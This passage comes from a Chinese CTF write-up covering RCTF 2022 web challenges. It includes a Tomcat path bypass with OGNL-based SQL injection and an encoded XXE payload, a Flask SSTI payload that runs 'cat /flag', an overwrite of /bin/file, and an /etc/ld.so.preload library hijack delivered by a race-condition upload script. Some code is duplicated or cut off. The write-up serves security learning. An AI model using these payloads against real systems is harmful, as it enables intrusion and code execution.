FilterChain chain) throws ServletException, IOException &#123;\n    if (isWhite(request) || auth()) &#123;\n      chain.doFilter(request, response);\n    &#125; else &#123;\n      response.getWriter().write(\"auth fail\");\n    &#125; \n  &#125;\n  \n  public boolean isWhite(ServletRequest req) &#123;\n    HttpServletRequest request = (HttpServletRequest)req;\n    if (request.getRequestURI().endsWith(\".ico\"))\n      return true; \n    return false;\n  &#125;\n  \n  public boolean auth() &#123;\n    return false;\n  &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n\n这里看到开始页面的auth fail的触发条件\nif (isWhite(request) || auth())\n其中\nauth()是一定返回false\n所以我们需要让isWhite(request)返回true，才能继续后续步骤\n在isWhite()中可知\nif (request.getRequestURI().endsWith(if (request.getRequestURI().endsWith(\".ico\"))\nreturn true; \nreturn false;\n&#125;\n\n需要URI后以ico结尾，但是又不能访问一个不存在的文件，不然后面的访问都是失败的\n这里就需要利用一个知识点\nTomcat 以;一种奇怪的方式进行规范化\n也就是说在;后的不进行解析\n于是构造出\nhttp://127.0.0.1:8899/index;123.ico\n\n虽然显示500，但其实是成功了的\n然后就需要考虑如何进行xxe注入\n在com.example.demo.controller.DemoController中，正好有个名为xxe的函数\n\n在xxe函数上面还有个sayHello函数\nif (password.length() &gt; 50 || password.indexOf(&quot;&#x27;&quot;) != -if (password.length() &gt; 50 || password.indexOf(&quot;&#x27;&quot;) != -1) &#123;\n     System.out.println(\"not allow\");\n     return \"not allow\";\n   &#125;\n\n\n\n\n\n\n\n\n\n\n发现其对password这个参数中的数据也进行了过滤，长度不能超过50个字符，且其中不能有单引号&#39;\n否则就会失败返回\n\n\n\n\n\n\n\n\n\n并且在sayHello函数中，还有其他三个参数\nString poc, String type, String yourclasses\n这三个参数也是最后传入xxe函数的三个参数\nreturn xxe(poc, type, classes);\n\n【但是yourclasses参数被进行了分割，以,为分割，分成4份\nString[] classes = yourclasses.split(&quot;,&quot;, String[] classes = yourclasses.split(&quot;,&quot;, 4);\n\n所以对yourclasses的参数赋值需要考虑\n\n\n\n\n\n\n\n\n\n&#x3D;&#x3D;&gt;xxe注入需要四个参数\nString password, String poc, String type, String yourclasses\n其中\n\npassword参数值需要绕过单引号（常识猜测是sql注入，以单引号闭合，用万能密码\npoc参数值按常理应该就是xxe注入的内容\ntype参数值还不太确定\nyourclasses参数值以,分割为4份，具体值可能就是帮助poc进行绕过过滤的\n\n同样在该类中，底下就是过滤黑名单\n\n\n\n\n\n\n\n\n\n\n可以看到将!DOCTYPE进行了过滤\npassword参数查找password参数在哪里被利用时\n在com.example.demo.mapper.UserProvider\n\n发现其果然被sql查询利用 ，以&#39;)闭合\n但是单引号被过滤了如何闭合，然后实现万能密码呢\nOgnl 注入绕过引用过滤$&#123;@java.lang.Character$&#123;@java.lang.Character@toString(39)&#125;\n\n\n\n\n\n\n\n\n\n\n简而言之，mybatis会调用OGNL parser来解析sql语句中以 $&#123;&#125; 或者 #&#123;&#125; 中的表达式并将执行结果替换进去\n这里的39就是单引号的ascii编码\n于是构造sql注入万能密码\n\n\n\n\n\n\n\n\n\npassword=1$&#123;@java.lang.Character@toString(39)&#125;) or 1=1#\npoc参数先分析一下xxe函数\npublic static String xxe(String b64poc, String type, String[] classes) public static String xxe(String b64poc, String type, String[] classes) throws Exception &#123;\n    String res = \"\";\n    byte[] bytepoc = Base64.getDecoder().decode(b64poc);\n    if (check(bytepoc)) &#123;\n      DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n      DocumentBuilder builder = dbf.newDocumentBuilder();\n      InputSource inputSource = null;\n      Object wrappoc = null;\n      Constructor constructor = Class.forName(classes[0]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;);\n      if (type.equals(\"string\")) &#123;\n        String stringpoc = new String(bytepoc);\n        wrappoc = constructor.newInstance(new Object[] &#123; stringpoc &#125;);\n      &#125; else &#123;\n        wrappoc = constructor.newInstance(new Object[] &#123; bytepoc &#125;);\n      &#125; \n      inputSource = Class.forName(classes[2]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;).newInstance(new Object[] &#123; wrappoc &#125;);\n      Document doc = builder.parse(inputSource);\n      NodeList nodes = doc.getChildNodes();\n      for (int i = 0; i if (nodes.item(i).getNodeType() == 1) &#123;\n          res = res + nodes.item(i).getTextContent();\n          System.out.println(nodes.item(i).getTextContent());\n        &#125; \n      &#125; \n    &#125; \n    return res;\n  &#125;\n\n可以看到poc传入后变为b64poc\n然后b64poc进行base64解码，然后check函数进行过滤!DOCTYPE\nbyte[] bytepoc = Base64.getDecoder().decode(b64poc);\n\n这里就提及一个知识点xxe的编码绕过\n\n\n\n\n\n\n\n\n\n一个 xml 文档不仅可以用 UTF-8 编码，也可以用 UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412) 和 EBCDIC 编码。\n而一般过滤都是单字符集过滤，利用上面的编码就可以绕过，而且利用上面方式加码的xml文档仍然可以被正常读取解析，\n这里将其进行UTF-16加码，于是构造payload\nimport java.util.Base64;\n\npublic class Main &#123;\n    public static void main(String[] args) throws Exception &#123;\n        String body = \"\n                + \"\\t \\n\"\n                + \"]> \\n\"y\n                + \"&xxe;\";\n        String type = \"UTF-32\";\n        String poc = new String(Base64.getEncoder().encode(body.getBytes(type)));\n        System.out.println(\"poc=\"+poc);\n    &#125;\n&#125;\n\n最后得到poc的参数值\n\n\n\n\n\n\n\n\n\npoc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA+AAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg==\n但是发送请求包中base64编码，需要对数据再进行url编码，不然类型=或+会被视为url中的参数和空格符号\npoc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D\ntype参数在xxe函数中，对于type参数\nif (type.equals(if (type.equals(\"string\")) &#123;\n        String stringpoc = new String(bytepoc);\n        wrappoc = constructor.newInstance(new Object[] &#123; stringpoc &#125;);\n      &#125; else &#123;\n        wrappoc = constructor.newInstance(new Object[] &#123; bytepoc &#125;);\n      &#125;\n\n似乎对于结果没什么影响，只是对type参数值为不为string时，对wrappoc值有变化【是byte类型的poc参数值，还是string类型的poc参数值】\n但是wrappoc参数对后续结果没用影响，猜测type参数值应该可以顺便填，就按其代码赋值也行\n\n\n\n\n\n\n\n\n\ntype=string\nyourclasses参数yourclasses参数传入xxe函数时，以classes参数名\n前面提到过,yourclasses参数以,为分割，分成四份\n前两部分\nConstructor&lt;?&gt; constructor = Class.forName(classes[0]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[Constructor&lt;?&gt; constructor = Class.forName(classes[0]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;);\n\n后两部分\ninputSource = Class.forName(classes[2]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;).newInstance(new inputSource = Class.forName(classes[2]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;).newInstance(new Object[] &#123; wrappoc &#125;);\n      Document doc = builder.parse(inputSource);\n\n先分析一下\n\n\n\n\n\n\n\n\n\nConstructor&lt;?&gt; constructor = Class.forName(classes[0]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[Constructor&lt;?&gt; constructor = Class.forName(classes[0]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;)\n\njava.lang.Class 类的**forName()**方法用于获取具有指定类名的该类的实例。此类名称指定为字符串参数\n简而言之，Class.forName 方法的作用，就是初始化给定的类。\nclasses[0]&amp;classes[1]\n\n\n\n\n\n\n\n\nConstructor&lt;?&gt; constructor = Class.forName(classes[0]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[Constructor&lt;?&gt; constructor = Class.forName(classes[0]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;);\n\n这段代码使用了反射机制。它首先使用 Class.forName(classes[0]) 方法来获取类的 Class 对象。\n然后使用 getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;) 方法来获取该类的构造函数。\n该方法的参数是一个 Class 数组，表示该构造函数的参数类型。在这里，该构造函数只有一个参数，且其参数的类型是 classes[1] 中所表示的类。最后将获取到的构造函数赋值给 constructor 变量。\n\n反射机制是 Java 编程语言中一种用于获取类、接口、构造方法、字段、方法等信息的机制。反射机制允许程序在运行时动态地获取、使用、操作类的相关信息。\n\n&#x3D;&#x3D;&gt;\n\n\n\n\n\n\n\n\n\nclasses[0]：\n这个是看其他大佬wp清楚了，这里赋值字节数组 java.io.ByteArrayInputStream,然后bytepoc通过ByteArrayInputStream转换为输入流，因为其类中有read()可以读取数据\nclasses[1]：\n是数组参数数据类型，根据数组参数类型”[B“ 是表示字节数组byte[] (byte array) 的类型名称。\n\n在 java 中，数组类型的类型名称会在前面加上 “[“ 符号表示，比如[I代表 int 类型的数组类型名称，但是由于string不是基本数据类型，只能用类表示[Ljava.lang.String;\n\n所以\n\n\n\n\n\n\n\n\n\nclasses[0]=java.io.ByteArrayInputStream\nclasses[1]=[B   (因为bytepoc为byte数据类型，所以这里传入ByteArrayInputStream类中的构造函数的参数类型也声明为byte\nclasses[2]&amp;classes[3]\n\n\n\n\n\n\n\n\ninputSource = Class.forName(classes[2]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;).newInstance(new inputSource = Class.forName(classes[2]).getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;).newInstance(new Object[] &#123; wrappoc &#125;);\nDocument doc = builder.parse(inputSource);\n\n这里的inputSource参数是\nimport org.xml.sax.InputSource;\n...\nInputSource inputSource = null;\n\n\n\n这段代码首先使用 Class.forName(classes[2]) 方法来获取第三个参数所表示的类的 Class 对象，在这里是 org.xml.sax.InputSource 类，这个类是 SAX (Simple API for XML) 中用于读取 XML 文档的一个类。\n然后使用 getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;) 方法来获取该类的构造函数，在这里是 org.xml.sax.InputSource 类的构造函数，接受一个参数是 classes[3] 所表示的类。\n之后使用 newInstance(new Object[] &#123; wrappoc &#125;) 方法来创建一个 org.xml.sax.InputSource 类型的实例，使用参数值为 wrappoc 的构造函数来创建这个实例。\n接着使用 builder.parse(inputSource) 方法来解析 inputSource 对象，这里的 builder 是 DocumentBuilder 类型的对象，DocumentBuilder 是 javax.xml.parsers 包中提供的一个类，其作用是创建 DOM 解析器，用于解析 XML 文档\n&#x3D;&#x3D;&gt;\ninputSource值为恶意xml文件内容\ndoc值为解析恶意xml文件后得到的内容\n在代码还有一段实现打印的代码，这段代码就完成了把doc中解析恶意xml文档后得到的内容，打印输出\nNodeList nodes NodeList nodes = doc.getChildNodes();\n      for (int i = 0; i if (nodes.item(i).getNodeType() == 1) &#123;\n          res = res + nodes.item(i).getTextContent();\n          System.out.println(nodes.item(i).getTextContent());\n        &#125;\n\n\n\n\n\n\n\n\n\n\n这段代码首先使用 doc.getChildNodes() 方法获取文档中的所有子节点，并将它们存储在 NodeList 对象中。\n然后使用一个 for 循环来遍历 NodeList 中的每个子节点。在每次循环中，使用 nodes.item(i) 方法获取当前遍历到的子节点。\n之后使用 if 语句来检查当前子节点的类型。如果该类型为1 (即元素节点)，则使用 nodes.item(i).getTextContent() 方法获取该元素节点的文本内容并将其加到 res 变量中。然后使用 System.out.println(nodes.item(i).getTextContent()) 方法将该文本内容打印到控制台。\n总的来说，这段代码用于遍历文档中所有子节点，并将所有元素节点的文本内容提取出来并存储在 res 变量中，同时将其打印到控制台。\n这段代码通过遍历doc中的所有子节点,并将所有元素节点的文本内容获取出来并存储在res变量中,同时将其打印到控制台(这段代码在爬虫领域很常用来提取网页中的文本内容)\n所以\n\n\n\n\n\n\n\n\n\nclasses[2]=org.xml.sax.InputSource\n&#x2F;&#x2F;这里为org.xml.sax.InputSource类，用于读取xml文件，将其转化为可解析的xml格式，便于后面进行\nclasses[3]=java.io.InputStream     \n&#x2F;&#x2F;java.io.ByteArrayInputStream是java.io.InputStream的子类，但是java.io.ByteArrayInputStream不能直接作为构造函数的参数传入 org.xml.sax.InputSource 类的构造函数,因为org.xml.sax.InputSource和 java.io.InputStream 之间并没有继承关系。\n&#x2F;&#x2F;如果classes[3]=java.io.ByteArrayInputStream，会导致程序在执行 newInstance(new Object[] &#123; wrappoc &#125;) 方法时出现异常,因为类型不匹配，\n除非ByteArrayInputStream转换为InputStream 类型的对象才能传入 org.xml.sax.InputSource 类的构造函数\npayload\n\n\n\n\n\n\n\n\npassword=1$&#123;@java.lang.Character@toString(39)&#125;) or 1=1#&amp;poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D&amp;type=&quot;string&quot;&amp;yourclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream\n\nfilecheacker_mini\n\n\n\n\n\n\n\n\nhint:Just an easy file check challenge~~~The challenging environment restarts every three minutes\n只是一个简单的文件检查挑战~~~具有挑战性的环境每三分钟\n\n 似乎是一个文件上传的环境，\n先分析一下它的网站启动脚本app.py\nfrom flask from flask import Flask, request, render_template, render_template_string\nfrom waitress import serve\nimport os\nimport subprocess\n\napp_dir = os.path.split(os.path.realpath(__file__))[0]\napp = Flask(__name__)\napp.config[&#x27;UPLOAD_FOLDER&#x27;] = f&#x27;&#123;app_dir&#125;/upload/&#x27;\n\n@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])\ndef index():\n    try:\n        if request.method == &#x27;GET&#x27;:\n            return render_template(&#x27;index.html&#x27;,result=\"ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿\")\n\n        elif request.method == &#x27;POST&#x27;:\n            f = request.files[&#x27;file-upload&#x27;]\n            filepath = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], f.filename)\n\n            if os.path.exists(filepath) and \"..\" in filepath:\n                return render_template(&#x27;index.html&#x27;, result=\"Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)\")\n            else:\n                f.save(filepath)\n                file_check_res = subprocess.check_output(\n                    [\"/bin/file\", \"-b\", filepath], \n                    shell=False, \n                    encoding=&#x27;utf-8&#x27;,\n                    timeout=1\n                )\n                os.remove(filepath)\n                if \"empty\" in file_check_res or \"cannot open\" in file_check_res:\n                    file_check_res=\"wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ\"\n                return render_template_string(file_check_res)\n\n    except:\n        return render_template(&#x27;index.html&#x27;, result=&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;)\n\nif __name__ == &#x27;__main__&#x27;:\n    serve(app, host=\"0.0.0.0\", port=3000, threads=1000, cleanup_interval=30)\n\n开始看到flask就猜想这里存在的是ssti\nfrom flask from flask import Flask, request, render_template, render_template_string\n\n在这里发现它对我们上传的文件进行file命令\n file_check_res = subprocess.check_output(\n   [\"/bin/file\", \"-b\", filepath], \n   shell=False, \n   encoding=&#x27;utf-8&#x27;,\n   timeout=1\n)\n\n然后将返回值传给file_check_res\n最后一行是关键\nreturn render_template_string(file_check_res)\n\n它将file_check_res进行渲染，所以如果我们可以控制file命令后的文件返回值是一个ssti注入语句那么就可以实现对网站的ssti，并利用这个返回值返回flag\n如果单纯写个包含ssti语句的文本\n\n发现执行完file -b后，执行后只显示文件类型\nfile -b解析#!后内容显示这里就需要一个知识点#!后的内容，会被视为文件的解释器，然后打印出来，比如\n\n这里\na &#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125; script, ASCII text executable\n\n就看出来它把文本\n&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;\n\n当作了script解析器，在解析文件类型时，就把它打印出来了\n于是我们上传该文件\n\n得到flag\nfilecheacker_pro\n\n\n\n\n\n\n\n\nhint:An easier file check challenge.The zip decompression password is the flag value of filechecker_mini.Test your exploit locally first.The challenging environment restarts every three minutes.\n更简单的文件检查挑战。zip 解压缩密码是 filechecker_mini 的flag。首先在本地测试漏洞利用。具有挑战性的环境每三分钟重新启动一次。\n看看源码和mini的区别\nfrom flask from flask import Flask, request, render_template, render_template_string\nfrom waitress import serve\nimport os\nimport subprocess\n\napp_dir = os.path.split(os.path.realpath(__file__))[0]\napp = Flask(__name__)\napp.config[&#x27;UPLOAD_FOLDER&#x27;] = f&#x27;&#123;app_dir&#125;/upload/&#x27;\n\n@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])\ndef index():\n    try:\n        if request.method == &#x27;GET&#x27;:\n            return render_template(&#x27;index.html&#x27;,result=\"ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿\")\n\n        elif request.method == &#x27;POST&#x27;:\n            f = request.files[&#x27;file-upload&#x27;]\n            filepath = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], f.filename)\n\n            if os.path.exists(filepath) and \"..\" in filepath:\n                return render_template(&#x27;index.html&#x27;, result=\"Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)\")\n            else:\n                f.save(filepath)\n                file_check_res = subprocess.check_output(\n                    [\"/bin/file\", \"-b\", filepath], \n                    shell=False, \n                    encoding=&#x27;utf-8&#x27;,\n                    timeout=1\n                )\n                os.remove(filepath)\n                if \"empty\" in file_check_res or \"cannot open\" in file_check_res:\n                    file_check_res=\"wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ\"\n                return render_template(&#x27;index.html&#x27;, result=file_check_res)\n\n    except:\n        return render_template(&#x27;index.html&#x27;, result=&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;)\n\nif __name__ == &#x27;__main__&#x27;:\n    serve(app, host=\"0.0.0.0\", port=3000, threads=1000, cleanup_interval=30)\n\n发现在\nreturn render_template(return render_template(&#x27;index.html&#x27;, result=file_check_res)\n\n看来是无法进行ssti注入\n后面查看wp发现os.path.join存在一个技巧\n如果只是单纯的文件名字\nos.path.join(&#x27;path&#x27;,&#x27;abc&#x27;,&#x27;yyy.txt&#x27;)\n\n那么路径就是path/abc/yyy.txt\n如果后面的参数包含了&#39;/&#39;，那么前面的路径就会被忽略\n比如，\nos.path.join(&#x27;aaa&#x27;,os.path.join(&#x27;aaa&#x27;,&#x27;/bbb/ccc.txt&#x27;)\n\n那么路径就是/bbb/ccc.txt，而前面得aaa目录路径就被无视了\n于是在源码中这里，\nfilepath = os.path.join(app.config[filepath = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], f.filename)\n\n如果我们的文件名改成/bin/file会怎么样呢…\n那就代表/bin/file文件就被我们覆盖了，于是可以不用..跨目录也可以进行文件上传或者覆盖\n当在这里执行/bin/file时，就相当于执行我们的文件内容\nfile_check_res = subprocess.check_output(\n                   [\"/bin/file\", \"-b\", filepath], \n                   shell=False, \n                   encoding=&#x27;utf-8&#x27;,\n                   timeout=1\n               ) file_check_res = subprocess.check_output(\n                   [\"/bin/file\", \"-b\", filepath], \n                   shell=False, \n                   encoding=&#x27;utf-8&#x27;,\n                   timeout=1\n               )\n\n那么就显而易见我们可以构造\n#!/bin/bash\ncat /flag\n\n直接得到flag\n\n\n\n\n\n\n\n\n\n注意unix中是行尾只有换行也就是\\n，而win中才是以\\r\\n结尾\n而bp中改包的时候，回车会以win方式生成\\r\\n这两个 ,所以如果直接传上去覆盖/bin/file，实际上格式是错误的，无法执行，就会报错，所以需要删除\\r\n\nfilecheacker_pro_max\n\n\n\n\n\n\n\n\nhint:The zip decompression password is the flag value of filechecker_plus.Test your exploit locally first.The challenging environment restarts every three minutes.\nzip 解压缩密码是 filechecker_plus 的flag。首先在本地测试漏洞利用。具有挑战性的环境每三分钟重新启动一次。\nfrom flask from flask import Flask, request, render_template\nfrom waitress import serve\nimport os\nimport subprocess\n\napp_dir = os.path.split(os.path.realpath(__file__))[0]\napp = Flask(__name__)\napp.config[&#x27;UPLOAD_FOLDER&#x27;] = f&#x27;&#123;app_dir&#125;/upload/&#x27;\n\n@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])\ndef index():\n    try:\n        if request.method == &#x27;GET&#x27;:\n            return render_template(&#x27;index.html&#x27;,result=\"ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿\")\n\n        elif request.method == &#x27;POST&#x27;:\n            f = request.files[&#x27;file-upload&#x27;]\n            filepath = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], f.filename)\n\n            if os.path.exists(filepath):\n                return render_template(&#x27;index.html&#x27;, result=f\"&#123;filepath&#125; already exists (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)\")\n            else:\n                f.save(filepath)\n                file_check_res = subprocess.check_output(\n                    [\"/bin/file\", \"-b\", filepath], \n                    shell=False, \n                    encoding=&#x27;utf-8&#x27;,\n                    timeout=1\n                )\n                os.remove(filepath)\n                if \"empty\" in file_check_res or \"cannot open\" in file_check_res:\n                    file_check_res=\"wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ\"\n                return render_template(&#x27;index.html&#x27;, result=file_check_res)\n\n    except:\n        return render_template(&#x27;index.html&#x27;, result=&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;)\n\nif __name__ == &#x27;__main__&#x27;:\n    serve(app, host=\"0.0.0.0\", port=3000, threads=1000, cleanup_interval=30)\n\n和上道题目题目不同，这道题修复了文件覆盖，\nreturn render_template(&#x27;index.html&#x27;, result=f&quot;return render_template(&#x27;index.html&#x27;, result=f&quot;&#123;filepath&#125; already exists (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)\")\n\n但是仍然可以利用这里\nfilepath = os.path.join(app.config[filepath = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], f.filename)\n\n进行跨目录文件上传\n我们仍然需要实现rce，但是服务器shell中唯一执行的命令只有/bin/file -b\n前置知识\n\n\n\n\n\n\n\n\n\n使用 strace 命令查看系统调用【通过这个命令，查看/bin/file命令执行的调用过程，看看有没有可以中间利用劫持的，这个需要进docker中查看】\n\n\n我们需要找的是/bin/file命令执行过程中调用的文件，并且这个文件不存在，这样我们才可以成功上传\n\n这里就看到一个合适的目标文件\n\n\n\n\n\n\n\n\n\n/etc/ld.so.preload，因为其不存在，但是在执行/bin/file时会调用它\n确实不认识这个文件，搜一下得到\n\n\n\n\n\n\n\n\n\n/etc/ld.so.preload在某种程度上取代了LD_PRELOAD。\n由于安全问题，LD_PRELOAD受到严格的限制：它不能执行任意的setuid二进制文件，因为如果可以的话，你可以用自己的恶意代码替换库例程，例如在这里进行很好的讨论。事实上，你可以在ld.so用户手册中阅读：\n\nLD_PRELOAD\n要在所有其他库之前加载的其他用户指定的 ELF 共享库的列表。列表中的项目可以用空格或冒号分隔。这可用于有选择地覆盖其他共享库中的函数。使用“说明”下给出的规则搜索库。对于 set-user-ID&#x2F;set-group-ID ELF 二进制文件，将忽略包含斜杠的预加载路径名，并且仅当在库文件上启用了 set-user-ID 权限位时，才会加载标准搜索目录中的库。\n相反，文件 &#x2F;etc&#x2F;ld.so.preload 没有这样的限制，其想法是，如果你可以读/写目录 /etc，你就已经有了 root 凭据。因此它的使用。\n请记住，即使一开始您似乎没有 /etc/ld.so.preload，您也可以使用 /etc/ld.so.preload：它只不过是 glibc 的一个功能，因此是所有 Linux 发行版（但据我所知，不是 Unix 风格），因此您可以创建它并将任何 Linux 发行版中任何 setuid 库的名称放入其中， 它会起作用。\n\n也就是说它是一个加载库的配置文件，相当于命令的所需库的配置，当命令执行时其中的二进制配置文件也会被认为是该命令执行的一个部分进行加载执行\n\n\n\n\n\n\n\n\n\n所以我们需要上传两个文件，一个是能够执行cat /flag的二进制文件，一个是/etc/ld.so.preload文件，而且/etc/ld.so.preload中需要包含改二进制文件路径，以实现加载的目的\n\n\n\n\n\n\n\n\n\n*所谓的库，实际上就是/bin/file命令执行过程中用到的函数的定义库，而上传的二进制文件的主要目的就是劫持/bin/file命令中的利用的函数，进行重新定义\n在file&#x2F;magic.h.in at 30ad4181ef4f2f09d36aee1163386b8d2904d0e0 · file&#x2F;file (github.com)中查看file利用的函数，发现magic_version()很合适，因为它不需要参数\n\n构造利用文件于是构造二进制文件\nhaha.c\n#include #include \n\nvoid magic_version() &#123;\n  system(\"cat /flag\");\n&#125;\n\ngcc haha.c -o haha.so -fPIC -shared -ldl -D_GNU_SOURCE\n#-fPIC: 指定生成位置无关代码（Position-Independent Code, PIC），这是必要的，因为共享库可以在内存中的任意位置加载，所以需要确保代码中的地址引用是相对的而不是绝对的。\n#-shared: 指定生成共享库，这意味着代码将被编译成一个动态链接库（也称为共享对象），而不是可执行文件。\n#-ldl: 链接动态加载器库（Dynamic Loading Library, dl），这个库提供了动态加载和链接共享库的接口，程序可以使用它来在运行时加载和链接共享库。\n#-D_GNU_SOURCE: 定义一个宏，它告诉编译器使用 GNU 标准库的特定功能，这些功能不是 C 标准的一部分。\n\n得到haha.so，我们可以将其传到&#x2F;tmp下，避免在upload目录下被\n于是可以构造/etc/ld.so.preload内容\n/tmp/haha.so\n\n这样它就会加载/tmp/haha.so\n\n但是上传完一个文件后，执行完/bin/file，会执行\nos.remove(filepath)\n\n删除该文件，所以想要在实现上面操作，就必须在&#x2F;bin&#x2F;file执行前将两个文件上传上去，才能实现劫持该命令实现cat /flag，所以这里需要进行条件竞争\n写个简单py进行竞争，或者用bp放包\nimport requests\nimport threading\nimport re\n\nurl = \"http://192.168.80.138:3000/\"\n\ndef upload1():\n    file = &#123;\"file-upload\": (\"/etc/ld.so.preload\", open(\"./ld.so.preload\", \"r\"))&#125;\n    res = requests.post(url, files=file)\n    print(re.findall(\"(.*)\", res.text, re.S)[0])\n    \ndef upload2():\n    file = &#123;\"file-upload\": (\"/tmp/haha.so\", open(\"./haha.so\", \"rb\"))&#125;\n    res = requests.post(url, files=file)\n    print(re.findall(\"(.*)\", res.text, re.S)[0])\n    \nif __name__ == \"__main__\":\n    for i in range(100):\n        threading.Thread(target=upload1).start()\n        threading.Thread(target=upload2).start()\n\n\n得到flag\nC3一道0解的题目，最后提示了端口，看到就想到Cobaltstrike但是不知道怎么利用，于是准备复现CVE-2022-39197，当作题目复现了，内容写在在CVE漏洞学习\n\n\n\n\n\n\n\n\n\nhint：\nCommand and Control.\n该题无需爆破；\nport 50050\n这是一道CVE-2022-39197【Cobaltstrike RCE】真实环境中的漏洞利用\n","slug":"2022RCTF","date":"2023-02-13T15:21:49.888Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"0a5f9ba95c642a008814712ab15f1814","title":"DASCTF X GFCTF 2022十月挑战赛","content":"有水平的\n\n\nDASCTF X GFCTF 2022十月挑战赛1.EasyPOP一道构造pop链的题，拿来练习一下分析能力\n做反序列构造pop链最重要还是要会联想，从而触发方法\n\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass fine\n&#123;\n    private $cmd;\n    private $content;\n\n    public function __construct($cmd, $content)\n    &#123;\n        $this->cmd = $cmd;\n        $this->content = $content;\n    &#125;\n\n    public function __invoke()\n    &#123;\n        call_user_func($this->cmd, $this->content);\n    &#125;\n\n    public function __wakeup()\n    &#123;\n        $this->cmd = \"\";\n        die(\"Go listen to Jay Chou&#x27;s secret-code! Really nice\");\n    &#125;\n&#125;\n\nclass 